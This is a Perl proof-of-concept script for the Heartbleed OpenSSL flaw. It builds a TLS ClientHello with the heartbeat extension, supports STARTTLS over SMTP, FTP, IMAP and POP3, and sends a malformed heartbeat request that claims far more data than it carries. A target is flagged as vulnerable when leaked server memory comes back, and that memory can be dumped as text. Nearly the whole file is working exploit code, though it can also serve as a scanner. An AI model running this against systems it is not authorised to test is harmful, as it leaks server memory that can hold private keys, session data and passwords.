#!/usr/bin/perl

## Copyright (c) 2014, Daniel Heironimus  <aksfjh at gmail dot com>
## All rights reserved.
## Redistribution and use in source and binary forms, with or without 
## modification, are permitted provided that the following conditions are met:
##
## 1. Redistributions of source code must retain the above copyright notice, 
## this list of conditions and the following disclaimer.
##
## 2. Redistributions in binary form must reproduce the above copyright notice,
## this list of conditions and the following disclaimer in the documentation 
## and/or other materials provided with the distribution.
##
## THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
## AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
## IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
## ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
## LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
## CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
## SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
## INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
## CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
## ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF
## THE POSSIBILITY OF SUCH DAMAGE.

## Thanks to:
## Neel Mehta - Vulnerability discovery
## Riku - Vulnerability discovery
## Antti - Vulnerability discovery
## Matti - Vulnerability discovery
## Critical Watch research team - Test sites and consultation

## This script is based on code written by:
## Jared Stafford <jspenguin[at]jspenguin.org> - Original Proof of Concept
## FiloSottile - Go tool
## Christian Mehlmauer - Metasploit module
## wvu - Metasploit module
## juan vazquez - Metasploit module
## Sebastiano Di Paola - Metasploit module 

use strict;
use warnings;
use Getopt::Std;
use IO::Socket;

my $debug_level = 0;
my %opts        = ();
getopt( 'hpod', \%opts );
if ( notnull( $opts{'d'} ) and $opts{'d'} =~ /(\d+)/ ) {
    $debug_level = $1;
}
start_check(%opts);
exit(0);

### End Main ###

sub start_check {
    my %Options = @_;
    my $sock;

    if ( isnull( $Options{'h'} ) ) {
        debug( 0, "No IP specified" );
        return;
    }
    if ( isnull( $Options{'p'} ) ) {
        debug( 0, "No Port specified" );
        return;
    }
    eval { $sock = getSocket( $Options{'h'}, $Options{'p'} ); };
    if ($@) {
        debug( 0, "Couldn't create socket: " . $@ );
        return;
    }

    my $data;

    if ( notnull( $Options{'o'} ) ) {
        if ( !tls_check( $sock, $Options{'o'} ) ) {
            debug( 0, "Start TLS failed" );
            return;
        }
    }

    my $hello     = buildHello();
    my $heartbeat = buildHeartbeat();

    writePacket( $sock, $hello );
    if ( !readSSL($sock) ) {
        debug( 1, "SSL Hello - Cannot establish connection" );
        close $sock;
        return;
    }
    debug( 2, "Starting heartbeat request" );
    writePacket( $sock, $heartbeat );

    if ( readSSL($sock) ) {
        print $Options{'h'} . q{:}
            . $Options{'p'}
            . ( $Options{'o'} ? $Options{'o'} : q{} )
            . q{ VULNERABLE} . "\n";
    }
}    # END start_check

sub writePacket {
    my ( $socket, $buffer ) = @_;
    my $buff_len = length $buffer;
    debug( 3, "writing $buff_len bytes to socket" );
    my $count = syswrite( $socket, $buffer, $buff_len );

    if ( $count != $buff_len ) {
        debug( 0, "Error - syswrite failed" );
        return;
    }
    debug( 3, "Write - wrote $count bytes to socket" );
}    # END writePacket

sub readPacket {
    my ( $socket, $length ) = @_;
    my $timeout = 15;
    if ( !$length ) {
        $length  = 1048576;
        $timeout = 10;
    }
    my ( $buffer, $data ) = q{} x 2;

    eval {
        local $SIG{ALRM} = sub {
            if ($data) { die $data; }
            die;
        };
        alarm $timeout;
        while ( !$data or length $data < $length ) {
            sysread( $socket, $buffer, 1 );
            $data .= $buffer;
        }
        alarm 0;
    };
    if ( !$data ) {
        debug( 2, "0 bytes read from socket" );
        return '\0';
    }
    debug( 2, "" . length($data) . " bytes read from socket" );
    return $data;
}    # END readPacket

sub getSocket {
    my ( $host, $port ) = @_;
    if ($port) {
        $port =~ s/.*?(\d+).*?/$1/;
    }
    if ( !$port or !$host ) {
        debug( 0, "No host and/or port" );
        return;
    }
    debug( 2, "Creating socket to $host:$port" );
    socket( my $socket, AF_INET, SOCK_STREAM, 0 )
        or die( "Can't create socket" );

    connect( $socket, pack_sockaddr_in( $port, inet_aton($host) ) )
        or die( "Can't connect to socket" );
    debug( 2, "Connection successful" );
    return $socket;
}    # END getSocket

sub tls_check {
    my ( $sock, $proto ) = @_;
    $proto =~ s/\s//g;
    my $data = q{};
    if ( !$sock ) {
        debug( 0, "func - TLS - No socket" );
        return;
    }
    if ( !$proto ) {
        debug( 0, "func - TLS - No TLS protocol specified" );
        return;
    }
    debug( 2, "Starting TLS connection - $proto" );
    my %ack = (
        smtp => '^220\s',
        ftp  => '^220\s',
        imap => '^\*\s',
        pop3 => '^\+OK\s',
    );
    my %request = (
        smtp => "STARTTLS\r\n",
        ftp  => "AUTH TLS\r\n",
        imap => "a001 STARTTLS\r\n",
        pop3 => "STLS\r\n",
    );
    my %greeting = (
        smtp => '^220\s',
        ftp  => '^234\s',
        imap => '^a001\sOK\s',
        pop3 => '^\+\sOK\s',
    );
    if ( $proto =~ m/^ftp$/i ) {
        $data = readPacket($sock);
        debug( 3, "TLS Greeting - $data" );
        if ( !$data or $data !~ m/^234\s/i ) {
            debug( 1, "Error - FTP SSL Failed" );
            return;
        }
        writePacket( $sock, pack( "a*", $request{ftp} ) );
        $data = readPacket($sock);
        debug( 3, "TLS Acknowledgement - $data" );
        if ( !$data or $data !~ m/^220\s/i ) {
            debug( 1, "Error - FTP SSL Failed - Wrong request?" );
            return;
        }
    }
    elsif ( $proto =~ m/^smtp$/i ) {
        $data = readPacket($sock);
        chomp $data;
        debug( 3, "TLS Greeting - $data" );
        if ( !$data or $data !~ m/^220\s/i ) {
            debug( 1, "Error - SMTP SSL Failed" );
            return;
        }
        writePacket( $sock, pack( "a*", $request{smtp} ) );
        $data = readPacket($sock);
        debug( 3, "TLS Acknowledgement - $data" );
        if ( !$data or $data !~ m/^220\s/i ) {
            debug( 1, "Error - SMTP SSL Failed - Wrong request?" );
            return;
        }
    }
    elsif ( $proto =~ m/^pop3$/i ) {
        $data = readPacket($sock);
        debug( 3, "TLS Greeting - $data" );
        if ( !$data or $data !~ m/\+OK/i ) {
            debug( 1, "Error - POP3 SSL Failed" );
            return;
        }
        writePacket( $sock, pack( "a*", $request{pop3} ) );
        $data = readPacket($sock);
        debug( 3, "TLS Acknowledgement - $data" );
        if ( !$data or $data !~ m/\+OK/i ) {
            debug( 1, "Error - POP3 SSL Failed - Wrong request?" );
            return;
        }
    }
    elsif ( $proto =~ m/^imap$/i ) {
        $data = readPacket($sock);
        debug( 3, "TLS Greeting - $data" );
        if ( !$data or $data !~ m/\*\s/i ) {
            debug( 1, "Error - IMAP SSL Failed" );
            return;
        }
        writePacket( $sock, pack( "a*", $request{imap} ) );
        $data = readPacket($sock);
        debug( 3, "TLS Acknowledgement - $data" );
        if ( !$data or $data !~ m/a001\sOK/i ) {
            debug( 1, "Error - IMAP SSL Failed - Wrong request?" );
            return;
        }
    }
    else {
        debug( 0, "Unknown TLS service!" );
        return;
    }
    return 1;
}    # END tls_check

sub readSSL {
    my $sock       = shift @_;
    my $payload    = shift @_;
    my $hello_done = pack( "H*", '0e000000' );
    my ( $data, $type, $header, $tls_ver, $data_length ) = q{} x 5;
    $header = readPacket( $sock, 5 );
    if (!$header ){
        debug( 0, "Error - Server did not reply" );
    }
    if ( length $header < 5 ) {
        debug( 0, "Error - Non SSL header returned" );
        return;
    }
    $type        = unpack( "C*", substr( $header, 0, 1 ) );
    $tls_ver     = unpack( "H*", substr( $header, 1, 2 ) );
    $data_length = unpack( "n*", substr( $header, 3, 2 ) );
    if ( $type == 21 ) {
        $data = readPacket( $sock, $data_length );
        close $sock;
        debug( 0,
                  "Error - SSL Alert - "
                . unpack( "C*", substr( $data, 0, 1 ) ) . " - "
                . unpack( "n*", substr( $data, 1, 2 ) ) );
        return 0;
    }
    debug( 3, "Type - $type" );
    debug( 3, "TLS Version - $tls_ver" );
    debug( 3, "Data Length - $data_length" );
    if ( $type == 22 ) {
        $header = readPacket( $sock, 4 );
        if ( unpack( "C*", substr( $header, 0, 1 ) ) != 2 ) {
            return 0;
        }
        $data_length = unpack( "n*", substr( $header, 2, 2 ) );
        $data   = readPacket( $sock, $data_length );
        $header = readPacket( $sock, 5 );
        while ($header) {
            $type        = unpack( "C*", substr( $header, 0, 1 ) );
            $tls_ver     = unpack( "H*", substr( $header, 1, 2 ) );
            $data_length = unpack( "n*", substr( $header, 3, 2 ) );
            debug( 3, "Type - $type" );
            debug( 3, "TLS Version - $tls_ver" );
            debug( 3, "Data Length - $data_length" );
            $data = readPacket( $sock, $data_length );
            if ( $data eq $hello_done ) {
                debug(3, "Server hello complete");
                last; 
            }
            $header = readPacket( $sock, 5 );
        }
    }
    elsif ( $type == 24 ) {
        $data = readPacket( $sock, $data_length );
        if ( $data_length <= 1 ) {
            debug( 2, "Heartbeat - Not vulnerable?" );
            return 0;
        }
        $data = unpack( "H*", $data );
        $data =~ s/(\w\w)/$1 /g;
        my $ascii = q{};
        foreach my $hex ( split( /\s/, $data ) ) {
            if ( hex($hex) > 31 and hex($hex) < 127 ) {
                $ascii .= chr( hex($hex) );
                next;
            }
            $ascii .= '.';
        }
        debug( 3, "Heartbeat - ASCII data - $ascii" );
        if ( $ascii =~ /bowties are cool/i ) {
            debug( 2, "Heartbeat - Found implanted data" );
        }
    }
    else {
        return 0;
    }
    return 1;
}    # END readSSL

sub buildHello {
    ### Note: Data is gathered as hex and then packed
    my @ciphers = (    # Cipher list, 64 bit (8 byte) identifiers
        'c014',        # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
        'c00a',        # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
        'c022',        # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
        'c021',        # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
        '0039',        # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
        '0038',        # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
        '0088',        # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
        '0087',        # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
        '0087',        # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
        'c00f',        # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
        '0035',        # TLS_RSA_WITH_AES_256_CBC_SHA
        '0084',        # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
        'c012',        # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
        'c008',        # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
        'c01c',        # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
        'c01b',        # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
        '0016',        # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
        '0013',        # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
        'c00d',        # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
        'c003',        # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
        '000a',        # TLS_RSA_WITH_3DES_EDE_CBC_SHA
        'c013',        # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
        'c009',        # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
        'c01f',        # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
        'c01e',        # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
        '0033',        # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
        '0032',        # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
        '009a',        # TLS_DHE_RSA_WITH_SEED_CBC_SHA
        '0099',        # TLS_DHE_DSS_WITH_SEED_CBC_SHA
        '0045',        # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
        '0044',        # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
        'c00e',        # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
        'c004',        # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
        '002f',        # TLS_RSA_WITH_AES_128_CBC_SHA
        '0096',        # TLS_RSA_WITH_SEED_CBC_SHA
        '0041',        # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
        'c011',        # TLS_ECDHE_RSA_WITH_RC4_128_SHA
        'c007',        # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
        'c00c',        # TLS_ECDH_RSA_WITH_RC4_128_SHA
        'c002',        # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
        '0005',        # TLS_RSA_WITH_RC4_128_SHA
        '0004',        # TLS_RSA_WITH_RC4_128_MD5
        '0015',        # TLS_DHE_RSA_WITH_DES_CBC_SHA
        '0012',        # TLS_DHE_DSS_WITH_DES_CBC_SHA
        '0009',        # TLS_RSA_WITH_DES_CBC_SHA
        '0014',        # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
        '0011',        # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
        '0008',        # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
        '0006',        # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
        '0003',        # TLS_RSA_EXPORT_WITH_RC4_40_MD5
        '00ff',        # Unknown
    );

    my $random = q{};
    ### Get random hex bits
    for ( 0 .. 55 ) {
        $random .= ( 0 .. 9, 'a' .. 'f' )[ rand(16) ];
    }

    my $hello = join(
        q{},
        (   '0302',    # TLS Version
            unpack( "H*", pack( "N*", time() ) ),    # get time for TLS time
            $random,    # stuff random bits for a valid data section
            '00',       # Session ID length (no session id)
            unpack( "H*", pack( "n*", scalar(@ciphers) * 2 ) )
            ,           # Cipher length in bytes
            join( q{}, @ciphers ),    # Add ciphers
            '0100',    # Compression length (01) and method (null)
            '0005',    # Extension data length
            '000f',    # Extension type (heartbeat)
            '0001',    # Extension length
            '01',      # Extension data
        )
    );

    # Prepend data header info
    $hello
        = '0100'
        . unpack( "H*", pack( "n*", length( pack( "H*", $hello ) ) ) )
        . $hello;
    my $record = ssl_record( 'handshake', $hello );
    return $record;
}    # END buildHello

sub buildHeartbeat {
    my $payload
        = "banana";               # this is the message we send in the request
    my $stuffer
        = "!!Bowties are cool!!"; # the server is supposed to ignore this part
    
    my $type = '01';              # heartbeat request
    $payload = unpack( "H*", pack( "a*", $payload ) );
    $stuffer = unpack( "H*", pack( "a*", $stuffer ) );

    my $data = $payload . $stuffer;
    ### sometimes servers don't respond when using the max value, also, it's just a PoC
    my $length = '1000';
    my $record = ssl_record( 'heartbeat', $type . $length . $data );
    return $record;
}    # End buildHeartbeat

sub ssl_record {
    ### Data is supposed to be in hex form, pack it at the end
    my $type = shift @_;
    my $data = shift @_;
    my $tls  = '0302';
    if (!(     $type ne '22'
            or $type ne '24'
            or $type ne 'handshake'
            or $type ne 'heartbeat'
            or $type ne '0x16'
            or $type ne '0x18'
        )
        )
    {
        debug( 0, "Error - invalid SSL record type!" );
        return;
    }
    ### Convert type to hex
    if ( $type eq 'handshake' or $type eq '22' ) {
        $type = '0x16';
    }
    elsif ( $type eq 'heartbeat' or $type eq '24' ) {
        $type = '0x18';
    }
    $type =~ s/^0x//i;
    my $length = unpack( "H*", pack( "n*", length($data) / 2 ) );

    my $hex_pack = $type . $tls . $length . $data;
    my $packet = pack( "H*", $hex_pack );
    return $packet;
}    # END ssl_record

sub debug {
    my ( $level, $msg ) = @_;
    my $prefix = q{};
    my @output = ();

    if ( !$msg ) {
        $msg = q{};
    }
    if ( isnull($level) ) {
        return;
    }
    if ( $level and $level !~ /^\d+$/ ) {
        $msg   = $level;
        $level = 0;
    }
    if ( $msg and $msg =~ /\n|\r/ ) {
        @output = split( /\r|\n/, $msg );
    }
    else {
        push @output, $msg;
    }
    if ( $level <= 0 ) {
        $prefix = 'Error: ';
    }
    elsif ( $level == 1 ) {
        $prefix = 'Warn: ';
    }
    else {
        $prefix = 'Debug ' . ( $level - 1 ) . ': ';
    }
    if ( $level <= $debug_level + 1 ) {
        foreach my $line (@output) {
            print $prefix . $line . "\n";
        }
    }
}    # END debug

sub isnull {
    my $variable = shift @_;
    if ( !defined($variable) or length($variable) == 0 ) {
        return 1;
    }
    return 0;
}    # END isnull

sub notnull {
    my $variable = shift @_;
    return !isnull $variable;
}    # END notnull
